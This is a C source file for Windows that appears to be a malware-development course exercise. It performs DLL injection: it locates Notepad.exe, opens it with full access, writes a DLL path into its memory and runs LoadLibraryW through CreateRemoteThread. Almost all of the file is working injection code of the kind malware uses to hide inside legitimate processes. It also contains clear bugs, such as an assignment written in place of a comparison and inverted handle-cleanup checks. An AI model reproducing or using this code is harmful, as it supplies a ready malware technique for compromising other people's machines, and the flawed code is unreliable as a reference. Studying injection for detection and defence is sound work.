
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <tlhelp32.h>


BOOL GetProcessSnapshot(HANDLE hsnapshot, LPWSTR pprocessname, HANDLE* hprocess);
BOOL InjectDllToRemoteProcess(HANDLE hprocess, LPWSTR pDllPath);
int main() {

	HANDLE hsnapshot = NULL;
	LPWSTR pDllPath = L"C:\\Users\\ACER\\Desktop\\devm\\hackingwithmaldevacademy\\x64\\Debug\\hackingwithmaldevacademy.dll";
	LPWSTR pprocessname = L"Notepad.exe";
	HANDLE* hprocess = NULL;


	GetProcessSnapshot(hsnapshot, pprocessname, &hprocess);

	InjectDllToRemoteProcess(hprocess, pDllPath);


	printf("press <enter> to exit");
	getchar();


}

BOOL InjectDllToRemoteProcess(HANDLE hprocess, LPWSTR pDllPath) {

	BOOL bstate = TRUE;
	LPVOID ploadlibraryw = NULL;
	SIZE_T SizeOfDllPath = lstrlenW(pDllPath) * sizeof(WCHAR);
	SIZE_T lpnoofbyteswritten = NULL;
	LPVOID lpPageaddress = NULL;





	ploadlibraryw = (GetProcAddress(GetModuleHandle(L"kernel32.dll"),"LoadLibraryW"));

	lpPageaddress = VirtualAllocEx(hprocess, NULL, SizeOfDllPath, MEM_COMMIT |MEM_RESERVE, PAGE_READWRITE);

	if (lpPageaddress == NULL) {
		printf("virtual alloc ex failed with errono: %d\n", GetLastError());
		bstate = FALSE;
		goto _EndOfFunction;
	}

	else
	{
		printf("sucessfully allocated virtual memory at address 0x%lp\n", lpPageaddress);
	}

	if (!WriteProcessMemory(hprocess, lpPageaddress, pDllPath, SizeOfDllPath, &lpnoofbyteswritten) || SizeOfDllPath != lpnoofbyteswritten) {
		printf("the writeprocess memroy has failed with error no: %d", GetLastError());
		bstate = FALSE;
		goto _EndOfFunction;

	}
	printf("the process memory has been written with size %d\n", lpnoofbyteswritten);

	HANDLE hthread = CreateRemoteThread(hprocess, NULL, NULL, ploadlibraryw, lpPageaddress, NULL, NULL);

	if (hthread == NULL) {
		printf("Remote thread has been failed with errno: %d", GetLastError());
		bstate = FALSE;
		goto _EndOfFunction;
	}
	

_EndOfFunction:
	if (hthread = NULL)
		CloseHandle(hthread);
	return bstate;



}

BOOL GetProcessSnapshot(HANDLE hsnapshot, LPWSTR pprocessname, HANDLE* hprocess) {


	hsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (hsnapshot == NULL) {
		printf("snapshot cannot be taken due to error no: %d", GetLastError());
		goto _EndOfFunction;
	}

	PROCESSENTRY32 proc = { .dwSize = sizeof(PROCESSENTRY32) };

	if (!Process32First(hsnapshot, &proc)) {
		printf("process32first failed with error no: %d", GetLastError());
	}

	while (Process32Next(hsnapshot, &proc)) {

		printf("---%ls\\\n\n\t\t\\---%lu\n", proc.szExeFile, proc.th32ProcessID);

		if (wcscmp(proc.szExeFile, pprocessname) == 0) {
			printf("found the matched process at pid: %lu\n", proc.th32ProcessID);

			*hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, proc.th32ProcessID);


			if (*hprocess == NULL) {
				printf("the Openprocess failed with error no: %d", GetLastError());
			}

			break;




		}

	}


_EndOfFunction:
	if (hsnapshot == NULL)
		CloseHandle(hsnapshot);
	if (*hprocess == NULL)
		return FALSE;
	return TRUE;
}


